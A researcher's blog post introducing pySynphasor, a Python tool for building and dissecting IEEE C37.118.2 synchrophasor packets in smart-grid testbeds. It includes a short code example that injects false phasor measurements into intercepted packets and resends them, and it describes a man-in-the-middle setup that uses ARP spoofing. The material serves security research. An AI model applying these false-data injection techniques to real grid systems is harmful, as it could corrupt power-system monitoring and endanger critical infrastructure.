---
title: "pySynphasor: A Python Framework to Analyze, and Secure Synchrophasor Networks"
permalink: pySynphasor-python-based-pmu-packet-analyzer
date: 2025-06-02
excerpt: 
type: Blog
categories: 
tags: 
status:
---


Have you ever wanted to peek into the bytes flying between Phasor Measurement Units (PMUs) and PDCs?
What if you could _rebuild_ those packets, _inject false data_, and _test_ the grid’s resilience against real cyberattacks?
Welcome to **pySynphasor** — a powerful, open-source Python tool that enables packet-level manipulation of **IEEE C37.118.2** messages used in synchrophasor-based smart grids.

---

## ⚙️ What is pySynphasor?

`pySynphasor` is a Python module built on top of [Scapy](https://scapy.net/), tailored for:

- Parsing & building **IEEE C37.118.2** packets
- Injecting **False Data Injection Attacks (FDIA)**
- Running **MITM attacks** via ARP spoofing
- Creating **custom PDCs and µPMUs**

📦 Install it now:

```bash
pip install pySynphasor
```

🧠 Full docs + examples: [https://shuvangkardas.com/pySynphasor](https://shuvangkardas.com/pySynphasor)

---

## 🧪 1. Build a C37.118.2 Command Packet in Python

Let’s start simple — construct a basic command packet and inspect it.

### Code

```python
from pySynphasor.synphasor import *

cmdPkt = synphasor(type=4, idcode=10) / synphasor_cmd(cmd=5)
cmdPkt.show2()
print("Raw Bytes:", raw(cmdPkt))
```

### Output (Human-readable)

```
###[ IEEE C37.118.2 COMMON FRAME ]###
  synByte= 0xaa
  type= CMD
  version= Version 2
  framesize= 18
  idcode= 10

###[ synphasor command ]###
  cmd= 5
  chk= 0xb6b3
```

### Output (Machine/Raw)

```
Raw Bytes: b'\xaaB\x00\x12\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\xb6\xb3'
```

🧩 Just two lines to build a fully valid C37.118 command frame!

---
## 🔍 2. Dissect Real Packets from a Testbed

Captured a packet between a PMU and a PDC? `pySynphasor` will convert it into human-friendly structure.

```python
packet = sniff(count=1)[0]  # Get a packet
packet.show()
```

Output shows layers like:
- Ethernet
- IP/TCP
- IEEE C37.118.2 Common Frame
- Phasor Data (complex numbers)
    
---

## 🎯 3. Inject a False Data Attack (FDIA)

Imagine intercepting a synchrophasor packet and injecting **fake phasor measurements**. Here’s how we did that in our testbed:

### Code

```python
synPkt = packet['synphasor_data']
synPkt.pmu_data[0].phasors[0] = complex(30, 20)
synPkt.pmu_data[0].phasors[1] = complex(70, 80)

del packet[IP].chksum, packet[TCP].chksum
send(packet)
```

### Visual: Before vs After FDIA

|Measurement|Before Attack|After Attack|
|---|---|---|
|Phasor 1|(2453 + 2444j)|(30 + 20j)|
|Phasor 2|(2954 + 2780j)|(70 + 80j)|
|Phasor 3|(2922 + 2079j)|(unchanged in this demo)|

---

## 🕵️ 4. Man-in-the-Middle (MITM) Attack Setup

We deployed 3 VMs: µPMU, pyPDC, and attacker. Using ARP spoofing, we rerouted traffic via the attacker.

### ARP Poisoning Snapshot

|Device|IP|Original MAC|Spoofed MAC|
|---|---|---|---|
|PMU|10.0.2.4|08:00:27:c9:f7:61|08:00:27:a7:1b:c3|
|PDC|10.0.2.7|08:00:27:69:58:64|08:00:27:a7:1b:c3|

📸 ARP Table Comparison:  
![ARP Poisoning](https://shuvangkardas.com/pySynphasor/assets/arp_poisoning.png)

---

## 💡 pySynphasor vs Other Tools

|Feature|pyPMU|pySynphasor ✅|
|---|---|---|
|Build C37.118.2 Packets|✅|✅|
|Dissect Captured Packets|❌|✅|
|Perform FDIA/MITM|❌|✅|
|Includes pyPDC (multi-PMU)|❌|✅|
|Scapy-powered for full control|❌|✅|

---

## 📈 Future Work

We're expanding pySynphasor to:

- Support **IEC 61850-90-5** protocol
    
- Add **fuzz testing** capabilities
    
- Build a **GUI dashboard** for researchers
    

---

## 🧠 Conclusion

**pySynphasor** is more than a packet tool — it's a testbed enabler, a vulnerability scanner, and a research catalyst for cyber-physical power systems.

🔗 GitHub: [github.com/shuvangkardas/pySynphasor](https://github.com/shuvangkardas/pySynphasor)  
📘 Paper: [Scalable cyber‐physical testbed for cybersecurity evaluation of synchrophasors in power systems](https://ietresearch.onlinelibrary.wiley.com/doi/pdf/10.1049/cps2.12106)
🌐 Docs: [shuvangkardas.com/pySynphasor](https://shuvangkardas.com/pySynphasor)

👉 If this helped you or sparked ideas, don’t forget to ⭐ the repo and share!


---

Shuvangkar Das, PhD, Knoxville, Tennessee, USA
### ☎ Connect with me
- Twitter: [https://twitter.com/shuvangkar_das](https://twitter.com/shuvangkar_das)
- LinkedIn: [https://www.linkedin.com/in/ShuvangkarDas/](https://www.linkedin.com/in/ShuvangkarDas/)
- YouTube: [https://www.youtube.com/ShuvangkarDas](https://www.youtube.com/ShuvangkarDas)





